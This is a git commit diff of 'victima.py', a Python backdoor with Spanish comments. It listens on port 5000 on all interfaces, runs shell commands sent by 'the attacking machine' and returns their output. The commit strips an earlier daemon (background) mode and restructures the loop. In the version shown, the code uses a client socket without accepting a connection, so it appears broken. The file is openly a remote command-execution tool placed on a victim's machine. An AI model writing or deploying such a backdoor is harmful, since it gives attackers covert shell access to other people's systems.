96ad53c2a7b88d2fded9126ed682afdea3999c61
Gar1695 <139810535+Gar1695@users.noreply.github.com>
2023-07-18 16:05:09 -0500

    Update victima.py

--- victima.py
+++ victima.py
@@ -2,9 +2,6 @@ from socket import socket
 from subprocess import getoutput
 from os import chdir, getcwd
 from time import sleep
-import os
-import sys
-import daemon
 
 # Definimos la dirección y puerto, la dirección 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
 server_address = ('0.0.0.0', 5000)
@@ -18,42 +15,31 @@ server_socket.bind(server_address)
 # Cantidad de clientes máximos que se pueden conectar:
 server_socket.listen(1)
 
-def handle_connection(client_socket):
-    estado = True
+estado = True
 
-    while estado:
-        # Recibimos el comando de la máquina atacante
-        comando = client_socket.recv(4096).decode()
+while estado:
+    # Recibimos el comando de la máquina atacante
+    comando = client_socket.recv(4096).decode()
 
-        # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
-        if comando == 'exit':
-            # Cerramos la conexión con el cliente
-            client_socket.close()
-            estado = False
-        
-        elif comando.split(" ")[0] == 'cd':
-            # Cambiamos de directorio de trabajo
-            chdir(" ".join(comando.split(" ")[1:]))
-            client_socket.send("ruta actual: {}".format(getcwd()).encode())
-        
-        else :
-            # Ejecutamos el comando y obtenemos su salida:
-            salida = getoutput(comando)
-
-            # Enviamos la salida a la máquina atacante
-            client_socket.send(salida.encode())
-        
-        sleep(0.1)
-
-def main():
-    # Esperamos a recibir una conexión y aceptarla:
-    client_socket, client_address = server_socket.accept()
+    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
+    if comando == 'exit':
+        # Cerramos la conexión con el cliente
+        client_socket.close()
+        # Cerramos el socket servidor
+        server_socket.close()
+        estado = False
     
-    # Manejar la conexión en segundo plano
-    handle_connection(client_socket)
+    elif comando.split(" ")[0] == 'cd':
+        # Cambiamos de directorio de trabajo
+        chdir(" ".join(comando.split(" ")[1:]))
+        client_socket.send("ruta actual: {}".format(getcwd()).encode())
+    
+    else:
+        # Ejecutamos el comando y obtenemos su salida:
+        salida = getoutput(comando)
 
-# Ejecuta el script en segundo plano como un demonio
-if __name__ == '__main__':
-    with daemon.DaemonContext():
-        main()
+        # Enviamos la salida a la máquina atacante
+        client_socket.send(salida.encode())
+    
+    sleep(0.1)
 
